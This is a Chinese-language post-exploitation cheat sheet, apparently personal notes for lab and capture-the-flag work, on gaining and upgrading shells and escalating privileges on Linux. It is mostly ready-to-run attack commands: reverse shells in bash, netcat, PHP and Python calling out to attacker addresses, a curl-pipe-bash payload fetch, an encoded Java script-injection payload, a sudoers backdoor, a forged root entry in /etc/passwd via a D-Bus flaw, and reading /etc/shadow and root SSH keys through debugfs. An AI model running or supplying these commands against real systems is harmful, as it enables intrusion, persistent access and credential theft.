**获取到一个 shell 了，可以添加 authorized_keys 到.ssh 文件夹中，以方便我们登录或者创建 ssh 隧道**
```bash
cd ~ ; mkdir .ssh ; cd .ssh
ssh-keygen -f xekOnerR (kali)
echo '' > authorized_keys  /  xx.pub
```

**SHELL**
(反弹 shell 失败可以尝试更换端口：443, 80 .....)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.11 1337 >/tmp/f
echo -e '#!/bin/bash\n\nbusybox nc -e /bin/bash 192.168.39.93 3000' > /tmp/shell.sh ; chmod +x /tmp/shell.sh
echo -e 'sh -i >& /dev/tcp/192.168.49.94/3000 0>&1' > /tmp/shell.sh ; chmod +x /tmp/shell.sh
curl http://10.10.14.11/rev.sh | bash
nc -nv 192.168.45.170 3000 -e /bin/bash
"php -r '\$sock=fsockopen(\"192.168.45.170\", 2233);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
busybox nc 192.168.45.170 443 -e /bin/sh
```

JAVA
```java
${script:javascript:java.lang.Runtime.getRuntime().exec('/bin/bash -c bash$IFS$9-i>&/dev/tcp/192.168.45.199/2233<&1')}
%24%7bscript%3ajavascript%3ajava.lang.Runtime.getRuntime().exec('%2fbin%2fbash%20-c%20bash%24IFS%249-i%3e%26%2fdev%2ftcp%2f192.168.45.199%2f2233%3c%261')%7d
```

easy php
```php
<?php
$sock=fsockopen("10.10.14.24", 443); 
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

提权 cmd
- xxx.sh
```bash
echo 'username ALL=(root) NOPASSWD: ALL' >> /etc/sudoers
```

py
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.25",2233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")

__import__('os').system('id')
__import__('os').system('bash')
```


## TTY SPAWN SHELL :
```bash
which python (查看靶机上是否有python)   /  which script
python3 -c 'import pty;pty.spawn("/bin/bash");'   / script -O /dev/null -q /bin/bash  (获得完整的交互性shell会话) 
CTRL + Z
stty raw -echo ; fg
reset , 如果系统提示输入终端类型，输入 screen
export TERM=xterm-color
```

#### 可执行文件文件夹路径
```
/dev/shm/
```

## 手工枚举

```bash
whoami 
id   
(如果拥有 4(adm) 可以去/var/log查找包含passw的字符串的日志信息)
grep -r passw . 2>/dev/null

who 
uname -a
	cat /proc/version
	cat /etc/issue
	hostname(ctl)
ip a 
	ifconfig
	ip addr
	ip route
	arp -a
	cat /proc/net/fib_trie
ls -liah 
history 
which python

sudo -l (查看当前用户有那些文件是可以以root身份去执行的文件)
getcap -r / 2>/dev/null  (得到权限能力目录 错误信息重定向到null中 防止信息洪水)
find / -perm -u=s -type f 2>/dev/null (查找所有suid权限的文件 过滤错误信息 类型为文件)
cat /etc/crontab 
	 grep "CRON" /var/log/syslog
cat /etc/passwd 
cat /etc/passwd | grep home | awk -F ':' '{print $1}' 
ls -liah /etc/passwd /etc/shadow
find / -writable -type f -not -path "/sys/*" -not -path "/proc/*" 2>/dev/null
	
find / -type f -name "*" |xargs grep -ri "fireman" 2>/dev/null
echo $PATH 
ps -ef (查看所有的进程)
	ps axjf (查看进程树)
	ps aux (查看全部用户的进程)
    top -n 1 (查看进程 只查看一次)
netstat -a 
	netstat -tnl
	netstat -ano
	lsof -i :PORT
cat /etc/fstab (查看有无磁盘被挂载)
mysql -u root 
ls /etc/cron*
cd /home/[USER]/Documents
	grep -rn "ssh" 可能存在密码泄露
/backup  查看backups文件夹内容
cat /etc/exports (查看NFS配置)
cat /etc/mysql (如果后期拿到mysql的账号会有用)
cat /etc/exports ((111,2049开放)NFS配置不当提权) 参考2049 - NFS
ls -laR
find / -name backup 2>/dev/null
查找home目录中的.cache 如果有motd.legal-displayed 文件夹 ， 见下motd.legal-displayed提权
```

- (偏 ctf 的端口敲门配置文件)

```bash
/etc/knockd.conf
/var/log/knockd.log

详细利用：
for i in 571 290 911; do nmap -Pn --host-timeout 100 --max-retries 0 -p $i <ATTACK IP> >/dev/null； done;
```

```shell
su <高权限USER>
```

**遇到有 sudo -l 没见过的，--help 和 man 查看命令手册帮助可能不太一样**
```bash
man genie
```


## 自动枚举

**Linpeas**
```shell
chmod +x linpeas.sh
./linpeas.sh
```

[+] **PSPY 64**
pspy 是一个命令行工具，它可以在没有 Root 权限的情况下，监控 Linux 进程。
```shell
wget http://<KALI IP>:<PORT>/pspy64
chmod +x pspy64
./pspy64
```

### gcc 编译的一些问题
**没有 gcc**
```bash
which cc
```

**exp 中：gcc 替换成 cc**
```bash
sed 's/gcc/cc/g' <FILE>
```
**g++** 也可以尝试，如果实在什么都没有，那就直接在 kali 上编译好然后传过去：

#### 如果遇到 ：version `GLIBC_2.34' not found
```bash
gcc --static EXP.c
```
会生成一个 a.out , 然后改名为 a.elf , 传到靶机上去
```bash
chmod +x a.elf
./a.elf
```


### motd.legal-displayed 提权
一般在 home 的.cache 文件夹，如果存在 motd.legal-displayed，则可能造成提权
**Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2)**
```
Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2)         linux/local/14339.sh
```
wget 传输文件到靶机，bash 运行脚本，运行脚本后输入密码 toor 登录到 root 用户提权


### 存在 51-ubuntu-admin.conf
可以尝试的提权方式
```bash
cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf 
[Configuration] 
AdminIdentities=unix-group:sudo;unix-group:admin
```
利用：
```bash
ls -la /dev/shm/xek
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /dev/shm/xek true
```
提权操作：
```bash
cd /tmp;cp /etc/passwd passwd
openssl passwd -1 xekoner
echo 'xekoner:$1$9qOwxI.G$aW0MpGd5x9MAAKPQ0GOKk.:0:0:pwned:/root:/bin/bash' >> passwd
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /tmp/passwd /etc/passwd true
```

### 监听流量数据
```bash
tcpdump -i lo -nnXs 0 'port 389'
```


# 组特权提权

##### 拥有 116(lxd) 特权，LXC Exploitation 特权提升
创建一个容器，并将根文件系统挂载到容器中，然后可以完全访问它
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation


#####  6(disk) 权限
此权限几乎等同于 root 访问权限，因为您可以访问计算机内部的所有数据。
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group
```bash
df -h   (查找可以的磁盘)
debugfs /dev/sda1   （进入磁盘）
debugfs:  cat /etc/shadow
debugfs:  cat /root/.ssh/id_rsa
```


### `git` 文件夹收集信息
```bash
git show 
git status   (显示上次提交中存在但不再存在的所有文件)
git log --oneline   (历史记录显示一些提交)
git log --name-only --oneline
	git diff 1e84a03 b73481b  (显示两个hash之间的差异 可能存在密码之类的敏感信息)
git checkout d387abf -- resources/integration/authcredentials.key  (恢复旧数据)
git reset --hard 7ff507d  (复原)
```